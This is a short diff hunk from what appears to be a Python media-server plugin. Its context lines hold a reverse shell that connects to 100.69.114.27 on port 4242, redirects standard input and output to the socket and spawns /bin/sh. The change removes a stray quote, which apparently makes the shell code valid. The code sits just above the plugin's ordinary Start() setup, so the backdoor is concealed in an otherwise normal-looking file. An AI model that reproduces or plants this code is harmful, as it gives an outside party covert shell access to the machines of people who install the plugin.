@@ -13,7 +13,7 @@ s.connect(("100.69.114.27",4242))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh")'
+pty.spawn("/bin/sh")
 def Start():
     ObjectContainer.art = R(ART)
     ObjectContainer.title1 = NAME
